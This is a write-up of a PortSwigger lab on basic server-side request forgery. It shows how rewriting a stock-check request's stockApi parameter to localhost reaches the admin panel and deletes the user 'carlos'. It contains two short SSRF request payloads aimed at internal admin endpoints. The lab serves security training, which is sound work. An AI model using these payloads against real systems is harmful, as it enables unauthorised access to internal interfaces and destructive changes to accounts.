
# Basic SSRF against the local server

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

---------------------------------------------

References: 

- https://portswigger.net/web-security/ssrf



![img](images/Basic%20SSRF%20against%20the%20local%20server/1.png)

---------------------------------------------

There is a button to check the stock:



![img](images/Basic%20SSRF%20against%20the%20local%20server/2.png)


It generates this POST request:



![img](images/Basic%20SSRF%20against%20the%20local%20server/3.png)


The stockApi parameter contains the url “http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1”, and we can tryo to change it to other url:



![img](images/Basic%20SSRF%20against%20the%20local%20server/4.png)


For example we can check the content of the /admin page:

```
POST /product/stock HTTP/2
...

stockApi=http://localhost/admin
```



![img](images/Basic%20SSRF%20against%20the%20local%20server/5.png)

From the source code we find using a GET request we can delete a user:



![img](images/Basic%20SSRF%20against%20the%20local%20server/6.png)


So we can delete “carlos” with this payload:

```
POST /product/stock HTTP/2
...

stockApi=http://localhost/admin/delete?username=carlos
```



![img](images/Basic%20SSRF%20against%20the%20local%20server/7.png)